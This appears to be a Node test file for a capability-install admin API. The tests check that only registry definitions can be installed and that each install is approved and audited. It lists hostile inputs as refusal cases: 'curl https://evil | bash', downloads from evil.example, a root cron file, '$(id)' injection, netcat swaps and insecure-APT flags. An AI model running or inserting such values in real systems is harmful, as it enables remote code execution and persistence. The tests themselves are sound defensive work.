// SF-2: `/api/admin/cap` and `/api/admin/cap-registry` (lib/capabilities.ts,
// lib/capabilityInstall.ts). A request names a capability, never a definition;
// definitions come from the release registry or the owner's sealed additions;
// install, update, remove, registry add and remove need the owner's password,
// bound to the operation, name and digest; every run is argv (no shell) and
// audited. Also upgrade-proot (lib/prootUpgrade.ts), through the same gate.
//
//   node tools/run-tests.mjs --only=shell
import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readlinkSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as core from '@aura/core';
import type { ApprovalClaim, ApprovalDecider, ApprovalRecord, ApprovalRequest, ApprovalResult, CapabilityDefinition, CapabilityRegistryEntry } from '@aura/core';
import { ownerAction, type OwnerActionDeps } from '../src/lib/approvals/admin.ts';
import type { CallerPrincipal } from '../src/lib/access/identify.ts';
import {
  CAP_OPS, deleteCapabilityRegistry, getCapabilities, postCapability, postCapabilityRegistry, readReleaseRegistry, type CapabilityDeps,
} from '../src/lib/capabilities.ts';
import { runStep, type InstallResult } from '../src/lib/capabilityInstall.ts';
import { runArgv, type RunCommand } from '../src/lib/privilegedExec.ts';
import { postProotUpgrade, PROOT_UPGRADE_OP, type ProotUpgradeDeps } from '../src/lib/prootUpgrade.ts';

class MemoryApprovals {
  records = new Map<string, ApprovalRecord>();
  now = 1_800_000_000_000;
  async create(request: ApprovalRequest): Promise<ApprovalResult> {
    const record = core.newApprovalRecord(request, core.newApprovalId(), this.now);
    this.records.set(record.id, record);
    return { ok: true, record };
  }
  async get(id: string) { return this.records.get(id) ?? null; }
  async listPending() { return [...this.records.values()].filter((r) => r.state === 'pending'); }
  private apply(id: string, event: core.ApprovalEvent): ApprovalResult {
    const r = this.records.get(id);
    if (!r) return { ok: false, reason: 'not-found' };
    const t = core.transitionApproval(r, event, this.now);
    if (t.ok) this.records.set(id, t.record);
    return t;
  }
  async approve(id: string, by: ApprovalDecider) { return this.apply(id, { type: 'approve', by }); }
  async deny(id: string, by: ApprovalDecider) { return this.apply(id, { type: 'deny', by }); }
  async consume(id: string, claim: ApprovalClaim) { return this.apply(id, { type: 'consume', claim }); }
  async isBlocked() { return false; }
  async block() { /* not used */ }
  async unblock() { return false; }
  async listBlocked() { return []; }
}

const OWNER: CallerPrincipal = { kind: 'user', userId: 'default', role: 'owner', sessionId: 'sess-desk-0001', verification: 'verified' };
const TERMINAL: CallerPrincipal = { kind: 'instance', appId: 'com.aura.terminal', instanceId: 'com.aura.terminal-1', userId: 'default', verification: 'verified' };
const SETTINGS: CallerPrincipal = { ...OWNER, through: { appId: 'com.aura.settings', instanceId: 'com.aura.settings-1' } } as CallerPrincipal;
const FRESH: ApprovalDecider = { kind: 'user', userId: 'default', sessionId: 'sess-desk-0001', fresh: true };
const CLICK: ApprovalDecider = { kind: 'user', userId: 'default', sessionId: 'sess-desk-0001', fresh: false };

const RELEASE: Record<string, unknown> = {
  nano: { source: 'apt', package: 'nano', binary: 'nano' },
  zot: { source: 'steps', binary: 'zot', binary_path: '/usr/local/bin/zot', steps: [{ download: { url: 'https://github.com/project-zot/zot/releases/download/v2.1.7/zot-linux-amd64-minimal', sha256: 'e'.repeat(64), to: '/usr/local/bin/zot', mode: '0755' } }] },
};

let approvals: MemoryApprovals;
let caller: CallerPrincipal;
let audits: Array<{ action: string; opts: any; actor: any }>;
let installs: Array<{ op: string; name: string; def: CapabilityDefinition; force?: boolean }>;
let owned: Record<string, CapabilityRegistryEntry>;
let overlays: string[][] = [];
let release: Record<string, unknown>;

function deps(): CapabilityDeps {
  const owner: OwnerActionDeps = {
    approvals: {
      store: approvals as never,
      appName: (id) => (id === 'com.aura.terminal' ? 'Terminal' : id === 'com.aura.settings' ? 'Settings' : null),
      audit: async () => { /* approvals' own */ },
      tickets: { peek: async () => null, claim: async () => null },
    },
    authenticate: async () => caller,
    shellOwner: async () => ({ identity: {} }),
  };
  return {
    ownerAction: (ctx, req) => ownerAction(ctx, req, owner),
    audit: async (actor, action, opts) => { audits.push({ action, opts, actor }); },
    run: () => { throw new Error('the route never runs a program itself'); },
    releaseRegistry: () => core.parseCapabilityRegistry({ capabilities: release }),
    store: {
      list: async () => owned,
      put: async (name, def, meta) => {
        const definition = core.parseCapabilityDefinition(name, def);
        const digest = core.capabilityDigest(name, definition);
        owned[name] = { definition, digest, addedAt: 'now', ...(meta?.approval ? { approval: meta.approval } : {}) };
        return { ok: true, changed: true, digest };
      },
      remove: async (name) => { const had = !!owned[name]; delete owned[name]; return { ok: true, changed: had }; },
    },
    writeOverlay: (o) => { overlays.push(Object.keys(o).sort()); },
    installer: {
      install: async (name, def, force): Promise<InstallResult> => {
        installs.push({ op: 'install', name, def, force });
        return { symlink: `/os/toolchain/bin/${name}`, version: '1.0', libsCopied: 0, libs: [], sidecars: [] };
      },
      remove: (name, def) => { installs.push({ op: 'remove', name, def }); },
      loadState: () => ({ capabilities: {}, services: {} }),
      saveState: () => undefined,
    },
    refresh: () => [],
  };
}

beforeEach(() => {
  approvals = new MemoryApprovals();
  caller = OWNER;
  audits = [];
  overlays = [];
  installs = [];
  owned = {};
  release = { ...RELEASE };
});

const req = (method: string, body?: unknown, headers: Record<string, string> = {}, path = '/api/admin/cap') => ({
  request: new Request(`http://shell.test${path}`, {
    method,
    headers: { authorization: 'Bearer aura-sess1.x', ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers },
    ...(body !== undefined ? { body: typeof body === 'string' ? body : JSON.stringify(body) } : {}),
  }),
  cookies: {} as never,
});
const read = async (r: Response) => ({ status: r.status, body: await r.json() as Record<string, any> });
const audit = (i = 0) => audits[i] as { action: string; opts: any; actor: any };
const nothing = () => { assert.equal(installs.length, 0, 'nothing ran'); assert.equal(approvals.records.size, 0, 'nobody was asked'); };

test('the release registry file validates and carries no shell command', () => {
  const reg = readReleaseRegistry(new URL('../../../.aura/capabilities.yaml', import.meta.url).pathname);
  for (const n of ['claude', 'nano', 'linux-coreutils', 'glab', 'nvm', 'code-server']) assert.ok(reg[n], n);
  assert.doesNotMatch(JSON.stringify(reg), /install_cmd/);
});

test('a request that carries a definition is refused; only action, name and force are read', async () => {
  for (const body of [
    { action: 'install', name: 'nano', entry: { source: 'curl', install_cmd: 'id' } },
    { action: 'install', name: 'nano', entry: { source: 'apt', package: 'nano' } },
    { action: 'install', name: 'nano', definition: { source: 'apt', package: 'netcat' } },
    { action: 'install', name: 'nano', steps: [{ apt: ['netcat'] }] },
    { action: 'install', name: 'nano', package: 'netcat-openbsd' },
    { action: 'install', name: 'nano', force: 'yes' },
    { action: 'exec', name: 'nano' },
  ]) {
    assert.equal((await postCapability(req('POST', body), deps())).status, 400, JSON.stringify(body));
  }
  for (const name of ['nano; id', '$(id)', '-x', '../nano', 'NANO', '', 1]) {
    assert.equal((await postCapability(req('POST', { action: 'install', name }), deps())).status, 400, String(name));
  }
  assert.equal((await postCapability(req('POST', { action: 'install', name: 'not-there' }), deps())).status, 404);
  nothing();
});

test('install from the System Terminal: the password, bound to operation, name and digest; runs once; audited', async () => {
  caller = TERMINAL;
  const first = await read(await postCapability(req('POST', { action: 'install', name: 'zot' }), deps()));
  assert.equal(first.status, 202);
  assert.equal(first.body.level, 'fresh');
  assert.match(first.body.display.details.join('\n'), /Download https:\/\/github\.com\/project-zot.*sha256 eeeeeeeeeeee/);
  const id = first.body.approvalId as string;
  const digest = core.capabilityDigest('zot', core.parseCapabilityDefinition('zot', RELEASE['zot']));
  assert.equal(approvals.records.get(id)?.payloadHash, core.payloadHash({ operation: CAP_OPS.install, name: 'zot', origin: 'release', digest, force: false }));
  assert.equal((await approvals.approve(id, CLICK)).ok, false, 'one click is not enough');
  assert.equal((await approvals.approve(id, FRESH)).ok, true);

  // Another capability, a force update or a remove is not covered.
  for (const body of [{ action: 'install', name: 'nano' }, { action: 'install', name: 'zot', force: true }, { action: 'remove', name: 'zot' }]) {
    assert.notEqual((await postCapability(req('POST', body, { 'x-aura-approval': id }), deps())).status, 200, JSON.stringify(body));
  }
  assert.equal(installs.length, 0);

  const done = await read(await postCapability(req('POST', { action: 'install', name: 'zot' }, { 'x-aura-approval': id }), deps()));
  assert.equal(done.status, 200);
  assert.equal(installs.length, 1);
  assert.equal(installs[0]?.def.steps?.length, 1);
  assert.equal(audit().action, CAP_OPS.install);
  assert.equal(audit().opts.outcome, 'ok');
  assert.equal(audit().opts.detail.digest, digest);
  assert.match(String(audit().actor.detail.requestedBy), /com\.aura\.terminal-1/);
  assert.deepEqual(audit().actor.by, { kind: 'user', userId: 'default', session: 'sess-des' });
  assert.notEqual((await postCapability(req('POST', { action: 'install', name: 'zot' }, { 'x-aura-approval': id }), deps())).status, 200, 'used up');
  assert.equal(installs.length, 1);
});

test('a successful install is persisted at once, read fresh after the install, before the refresh can fail', async () => {
  caller = TERMINAL;
  const order: string[] = [];
  let saved: any = null;
  const d = deps();
  d.installer = {
    ...d.installer,
    install: async (name) => { order.push(`install:${name}`); return { symlink: `/os/toolchain/bin/${name}`, version: '2.1.7', libsCopied: 0, libs: [], sidecars: [] }; },
    // A cap another request recorded while this install ran.
    loadState: () => { order.push('load'); return { capabilities: { nano: { installed: true, installedAt: 'x', version: '7' } }, services: {} }; },
    saveState: (s) => { order.push('save'); saved = s; },
  };
  d.refresh = () => { order.push('refresh'); throw new Error('refresh failed'); };
  const id = (await read(await postCapability(req('POST', { action: 'install', name: 'zot' }), d))).body.approvalId as string;
  assert.equal((await approvals.approve(id, FRESH)).ok, true);
  const r = await postCapability(req('POST', { action: 'install', name: 'zot' }, { 'x-aura-approval': id }), d);
  assert.equal(r.status, 500, 'the refresh failure is reported');
  assert.deepEqual(order, ['install:zot', 'load', 'save', 'refresh']);
  assert.equal(saved.capabilities.zot.installed, true);
  assert.equal(saved.capabilities.zot.version, '2.1.7');
  assert.equal(saved.capabilities.nano.installed, true, 'a concurrent record is not overwritten');
});

test('an install that fails records nothing', async () => {
  caller = TERMINAL;
  let saves = 0;
  const d = deps();
  d.installer = { ...d.installer, install: async () => { throw new Error('zot: its binary did not reach /data/aura/toolchain/bin'); }, saveState: () => { saves++; } };
  const id = (await read(await postCapability(req('POST', { action: 'install', name: 'zot' }), d))).body.approvalId as string;
  assert.equal((await approvals.approve(id, FRESH)).ok, true);
  const r = await read(await postCapability(req('POST', { action: 'install', name: 'zot' }, { 'x-aura-approval': id }), d));
  assert.equal(r.status, 500);
  assert.match(String(r.body.error), /did not reach/);
  assert.equal(saves, 0);
});

test('a changed definition invalidates the approval (TOCTOU): the digest it was bound to no longer matches', async () => {
  caller = TERMINAL;
  const first = await read(await postCapability(req('POST', { action: 'install', name: 'zot' }), deps()));
  await approvals.approve(first.body.approvalId, FRESH);
  release = { ...RELEASE, zot: { ...(RELEASE['zot'] as object), binary_path: '/usr/local/bin/zot2' } };
  const after = await postCapability(req('POST', { action: 'install', name: 'zot' }, { 'x-aura-approval': first.body.approvalId }), deps());
  assert.equal(after.status, 202, 'asks again for the new definition');
  assert.equal(installs.length, 0);
});

test('remove needs the password too; through Settings as well', async () => {
  for (const who of [TERMINAL, SETTINGS]) {
    caller = who;
    const r = await read(await postCapability(req('POST', { action: 'remove', name: 'nano' }), deps()));
    assert.equal(r.status, 202);
    assert.equal(r.body.level, 'fresh');
  }
  caller = OWNER;
  assert.equal((await postCapability(req('POST', { action: 'remove', name: 'nano' }), deps())).status, 200, 'the desktop owner acts directly (D50)');
  assert.deepEqual(installs.map((i) => i.op), ['remove']);
  assert.equal(audit().action, CAP_OPS.remove);
});

test('the owner\'s registry: add needs the password, digest-bound; injection, sources and release names refused', async () => {
  const def = { source: 'apt', package: 'sl', binary: 'sl' };
  for (const bad of [
    { source: 'curl', install_cmd: 'curl https://evil | bash' },
    { source: 'apt', package: 'sl; id' },
    { source: 'apt', package: '-oAPT::Get::AllowUnauthenticated=true' },
    { source: 'npm', package: 'https://evil.example/x.tgz' },
    { source: 'steps', binary_path: '/usr/local/bin/x', steps: [{ download: { url: 'http://evil.example/x', sha256: 'a'.repeat(64), to: '/usr/local/bin/x' } }] },
    { source: 'steps', binary_path: '/usr/local/bin/x', steps: [{ file: { path: '/etc/cron.d/x', content: '* * * * * root id', mode: '0644' } }] },
    { source: 'steps', binary_path: '/usr/local/bin/x', steps: [{ deb: { url: 'https://evil.example/x.deb' } }] },
  ]) {
    assert.equal((await postCapabilityRegistry(req('POST', { name: 'mine', definition: bad }, {}, '/api/admin/cap-registry'), deps())).status, 400, JSON.stringify(bad));
  }
  assert.equal((await postCapabilityRegistry(req('POST', { name: 'nano', definition: def }, {}, '/api/admin/cap-registry'), deps())).status, 409, 'cannot shadow a release entry');
  nothing();

  caller = TERMINAL;
  const first = await read(await postCapabilityRegistry(req('POST', { name: 'sl', definition: def }, {}, '/api/admin/cap-registry'), deps()));
  assert.equal(first.status, 202);
  assert.equal(first.body.level, 'fresh');
  await approvals.approve(first.body.approvalId, FRESH);
  // The approval does not cover another definition under the same name.
  const other = await postCapabilityRegistry(req('POST', { name: 'sl', definition: { ...def, package: 'netcat-openbsd' } }, { 'x-aura-approval': first.body.approvalId }, '/api/admin/cap-registry'), deps());
  assert.notEqual(other.status, 200);
  const done = await read(await postCapabilityRegistry(req('POST', { name: 'sl', definition: def }, { 'x-aura-approval': first.body.approvalId }, '/api/admin/cap-registry'), deps()));
  assert.equal(done.status, 200);
  assert.equal(owned['sl']?.digest, done.body.digest);
  assert.equal(owned['sl']?.approval, first.body.approvalId);
  assert.equal(audits.find((a) => a.action === CAP_OPS.registryAdd)?.opts.detail.digest, done.body.digest);
  // Phase 6 O: the effective registry overlay is regenerated with the new entry (nothing writes the release file).
  assert.deepEqual(overlays.at(-1), Object.keys(owned).sort());

  // Installing it asks again, bound to origin owner and its digest.
  const inst = await read(await postCapability(req('POST', { action: 'install', name: 'sl' }), deps()));
  assert.equal(inst.status, 202);
  assert.match(inst.body.display.details.join('\n'), /capabilities you added/);

  // Remove from the registry: the password too.
  const del = await read(await deleteCapabilityRegistry(req('DELETE', undefined, {}, '/api/admin/cap-registry?name=sl'), deps()));
  assert.equal(del.status, 202);
  assert.equal(del.body.level, 'fresh');
});

test('GET lists state and the resolved registry with origin and digest', async () => {
  owned['sl'] = { definition: core.parseCapabilityDefinition('sl', { source: 'apt', package: 'sl' }), digest: 'd', addedAt: 'now' };
  const r = await read(await getCapabilities(deps()));
  assert.equal(r.body.registry.nano.origin, 'release');
  assert.equal(r.body.registry.sl.origin, 'owner');
  assert.ok(r.body.state);
});

// ── the executor: argv and fs only ──────────────────────────────────────────

function fixture() {
  const dir = mkdtempSync(join(tmpdir(), 'cap-exec-'));
  const payload = join(dir, 'payload');
  writeFileSync(payload, '#!/bin/sh\necho hi\n');
  const sha = createHash('sha256').update(readFileSync(payload)).digest('hex');
  const calls: Array<{ file: string; args: readonly string[] }> = [];
  // curl is replaced by a local copy; everything else is recorded (apt) or real (tar).
  const run: RunCommand = (file, args, opts) => {
    calls.push({ file, args });
    if (file === 'curl') { writeFileSync(args[args.indexOf('-o') + 1]!, readFileSync(payload)); return ''; }
    if (file === 'apt-get') return '';
    return runArgv(file, args, opts);
  };
  return { dir, sha, calls, run };
}

test('executor: download is checked against its sha256 before it is placed; a mismatch installs nothing', async () => {
  const f = fixture();
  const to = join(f.dir, 'bin', 'tool');
  await runStep(f.run, { download: { url: 'https://example.com/tool', sha256: f.sha, to, mode: '0755' } });
  assert.equal(readFileSync(to, 'utf8'), '#!/bin/sh\necho hi\n');
  assert.equal(statSync(to).mode & 0o777, 0o755);
  const curl = f.calls.find((c) => c.file === 'curl')!;
  assert.deepEqual(curl.args.slice(0, 5), ['-fsSL', '--proto', '=https', '--proto-redir', '=https']);
  assert.equal(curl.args.at(-2), '--', 'the URL comes after --');

  const other = join(f.dir, 'bin', 'other');
  await assert.rejects(runStep(f.run, { download: { url: 'https://example.com/tool', sha256: 'b'.repeat(64), to: other } }), /does not match/);
  assert.equal(existsSync(other), false);
});

test('executor: apt is verified and argv; tar runs with -- and members; file and symlink are fs writes', async () => {
  const f = fixture();
  await runStep(f.run, { apt: ['unzip', 'curl'] });
  const install = f.calls.find((c) => c.args.includes('install'))!;
  assert.equal(install.file, 'apt-get');
  assert.ok(install.args.includes('APT::Get::AllowUnauthenticated=false'));
  assert.deepEqual(install.args.slice(-3), ['--', 'unzip', 'curl']);

  // A real tar.gz, extracted by members into a shared dir (merged, not replaced).
  const src = join(f.dir, 'src', 'pkg-1.0');
  mkdirSync(src, { recursive: true });
  writeFileSync(join(src, 'tool'), 'bin');
  writeFileSync(join(src, 'README'), 'doc');
  const tgz = join(f.dir, 'a.tgz');
  runArgv('tar', ['-czf', tgz, '-C', join(f.dir, 'src'), 'pkg-1.0'], { timeoutMs: 10_000 });
  const sha = createHash('sha256').update(readFileSync(tgz)).digest('hex');
  const run: RunCommand = (file, args, opts) => {
    if (file === 'curl') { writeFileSync(args[args.indexOf('-o') + 1]!, readFileSync(tgz)); return ''; }
    f.calls.push({ file, args });
    return runArgv(file, args, opts);
  };
  const shared = join(f.dir, 'shared');
  mkdirSync(shared);
  writeFileSync(join(shared, 'keep'), 'x');
  await runStep(run, { extract: { url: 'https://example.com/a.tgz', sha256: sha, format: 'tar.gz', strip: 1, members: ['pkg-1.0/tool'], to: shared } });
  assert.equal(readFileSync(join(shared, 'tool'), 'utf8'), 'bin');
  assert.ok(existsSync(join(shared, 'keep')), 'a members extract merges');
  assert.ok(!existsSync(join(shared, 'README')));
  const tar = f.calls.find((c) => c.file === 'tar')!;
  assert.deepEqual(tar.args.slice(-2), ['--', 'pkg-1.0/tool']);

  await runStep(run, { file: { path: join(f.dir, 'shim'), content: '#!/bin/sh\n', mode: '0755' } });
  assert.equal(statSync(join(f.dir, 'shim')).mode & 0o777, 0o755);
  await runStep(run, { symlink: { target: shared, path: join(f.dir, 'current') } });
  assert.equal(readlinkSync(join(f.dir, 'current')), shared);
});

test('source: no shell anywhere in the privileged path', () => {
  for (const f of ['../src/lib/privilegedExec.ts', '../src/lib/capabilities.ts', '../src/lib/capabilityInstall.ts', '../src/lib/prootUpgrade.ts', '../src/lib/baseInstall.ts', '../../core/src/runtimes/proot/chrootDevices.ts', '../../core/src/runtimes/proot/actions.ts',
    '../src/pages/api/admin/cap.ts', '../src/pages/api/admin/cap-registry.ts', '../src/pages/api/admin/upgrade-proot.ts', '../src/pages/api/admin/base-install.ts']) {
    const src = readFileSync(new URL(f, import.meta.url), 'utf8');
    assert.doesNotMatch(src, /\bexecSync\b|\bexec\(|shell:\s*true|\/bin\/sh -c|bash -c|install_cmd\)/, f);
    assert.doesNotMatch(src, /allow-unauthenticated|AllowInsecureRepositories=true|AllowUnauthenticated=true/, f);
  }
});

// ── upgrade-proot, through the same gate ────────────────────────────────────

test('upgrade-proot: a rebuild needs the password and is audited; reporting an existing build needs nobody', async () => {
  const ran: string[] = [];
  const pdeps = (installed: boolean): ProotUpgradeDeps => ({
    ...deps(),
    run: (file, args) => { ran.push([file, ...args].join(' ')); return file.endsWith('proot') ? 'proot v5.4.0' : ''; },
    exists: (p) => (p === '/usr/local/bin/proot' ? installed : false),
    // 5b PR: the mechanism is the PRoot module's (the route authorizes and audits).
    action: (id) => core.prootOwnerActions('/os/base-rootfs')[id],
  });
  const ctx = (q: string, headers: Record<string, string> = {}) => ({ ...req('POST', undefined, headers, `/api/admin/upgrade-proot${q}`), url: new URL(`http://shell.test/api/admin/upgrade-proot${q}`) });
  caller = TERMINAL;
  assert.equal((await read(await postProotUpgrade(ctx(''), pdeps(true)))).body.log.note, 'already installed — pass ?force=1 to rebuild');
  const asked = await read(await postProotUpgrade(ctx('?force=1'), pdeps(true)));
  assert.equal(asked.status, 202);
  assert.equal(asked.body.level, 'fresh');
  assert.deepEqual(ran, ['/usr/local/bin/proot --version'], 'nothing built before the approval');
  await approvals.approve(asked.body.approvalId, FRESH);
  const done = await read(await postProotUpgrade(ctx('?force=1', { 'x-aura-approval': asked.body.approvalId }), pdeps(true)));
  assert.equal(done.status, 200);
  assert.ok(ran.some((r) => r.startsWith('git clone --depth 1 --branch master -- https://github.com/proot-me/proot')));
  assert.ok(ran.some((r) => r.startsWith('install -m 0755 /tmp/proot-src/src/proot /usr/local/bin/proot')));
  assert.equal(audits.at(-1)?.action, PROOT_UPGRADE_OP);
});
